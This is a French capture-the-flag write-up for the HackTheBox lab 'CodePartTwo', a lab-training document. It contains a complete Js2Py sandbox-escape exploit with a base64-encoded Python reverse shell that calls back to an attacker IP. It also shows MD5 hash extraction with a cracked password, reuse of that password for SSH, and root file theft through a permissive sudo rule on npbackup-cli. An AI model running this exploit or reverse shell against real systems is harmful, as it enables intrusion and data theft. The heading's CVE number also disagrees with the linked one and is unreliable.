---
title: CodePartTwo
weight: 1
bookToc: false
---

<center>
    <img src="../img/cpt_illu.png" width="150px"/>
</center>

# Code Part Two

Dans cette room facile de la saison 9 de HackTheBox, nous allons exploiter des vulnérabilités connues et effectuer une escalade de privilège à cause de droits sudoers trop permissifs. 

## Port Enum

On commence par une énumération des ports qui révèle un port ssh et une application web sur le port 8000. l'application web utilise Gunicorn et est donc développée en python.

```bash
nmap -sS -sV -T5 10.129.10.60 -oN nmap.txt    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:35 CET
Nmap scan report for 10.129.10.60
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds
```

# Access

Sur le port 8000, nous trouvons une application web dont on peut télécharger le code source. Egalement il est possible de créer un compte et d'exécuter du code javascript.

En analysant le code source, on voit que l'application utilise Js2Py, et **cette librairie possède une CVE de type RCE connue**.

## Faille CVE-2024-39

Nous allons utiliser un [POC connu](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py) que nous allons adapter pour obtenir un reverse-shell :


```bash
let cmd = "eval $(echo 'cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTUuMTY5IiwxMzM3KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYXNoIikn' | base64 -d) "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

{{% hint warning %}}
Pour éviter d'avoir trop de problèmes avec les caractères spéciaux, on utilise une chaine de caractère encodée en base64 pour le reverse-shell python:
```
cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTUuMTY5IiwxMzM3KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJiYXNoIikn
```

{{% /hint %}}

## Récupération des credentials de Marco

En obtenant un shell, nous ne sommes pas connecté comme un utilisateur connu. Nous allons donc essayer de se connecter avec un autre utilisateur. En enumérant les fichiers de l'application nous trouvons une base SQLLite3. En listant directement les strings de cette base nous obtenons des hash de mot de passe, notamment au format md5 :

```bash
$ strings users.db

SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mappa97588c0e2fa3a024876339e27aeb42e)
Mmarco649c9d65a206a75f5abe509fe128bce5
        marco

```

En utilisant crackstation, on obtient le mot de passe de l'utilisateur marco :

<center>
    <img src="../img/cpt_crack.png" />
</center>

Donc on a les credentials suivant `marco:sweetangelbabylove`

**Ces credentials sont réutilisés pour la connexion SSH de l'utilisateur.**

# Privilege Escalation

## Misconfiguration : droits sudo trop étendus

Les droits sudo permettent à l'utilisateur marco d'exécuter la commande npbackup-cli comme root.

```bash
sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

```bash
$ sudo npbackup-cli --version
$ npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-25 13:00:00,220 :: INFO :: ExecTime = 0:00:00.007967, finished, state is: success.

```

dans npbackup-cli on voit que : 

- Nous avons besoin d’une nouvelle configuration de backup : on copie l’existante et on modife le dossier de backup (et la taille minimale du backup pour éviter les erreurs)
- On lance un nouveau backup
- on dump le fichier /root/root.txt qui contient le flag :

```bash
$ sudo npbackup-cli -b -c newbackup.conf 
2026-01-25 13:21:40,686 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-25 13:21:40,717 :: INFO :: Loaded config 09F15BEC in /home/marco/newbackup.conf
2026-01-25 13:21:40,728 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2026-01-25 13:21:43,018 :: INFO :: Snapshots listed successfully
2026-01-25 13:21:43,020 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2026-01-25 13:21:43,020 :: INFO :: Runner took 2.292039 seconds for has_recent_snapshot
2026-01-25 13:21:43,020 :: INFO :: Running backup of ['/root/'] to repo default
2026-01-25 13:21:44,117 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-01-25 13:21:44,117 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-01-25 13:21:44,117 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-01-25 13:21:44,117 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-01-25 13:21:44,117 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-01-25 13:21:44,118 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-01-25 13:21:44,118 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-01-25 13:21:44,118 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-01-25 13:21:44,118 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.609 KiB (39.887 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 8b2ba9b1 saved
2026-01-25 13:21:45,217 :: INFO :: Backend finished with success
2026-01-25 13:21:45,220 :: INFO :: Processed 197.7 KiB of data
2026-01-25 13:21:45,221 :: ERROR :: Backup is smaller than configured minmium backup size
2026-01-25 13:21:45,221 :: ERROR :: Operation finished with failure
2026-01-25 13:21:45,221 :: INFO :: Runner took 4.49483 seconds for backup
2026-01-25 13:21:45,221 :: INFO :: Operation finished
2026-01-25 13:21:45,230 :: INFO :: ExecTime = 0:00:04.546287, finished, state is: errors.



$ sudo npbackup-cli -c newbackup.conf --dump /root/root.txt
00000000fl4g000000000
```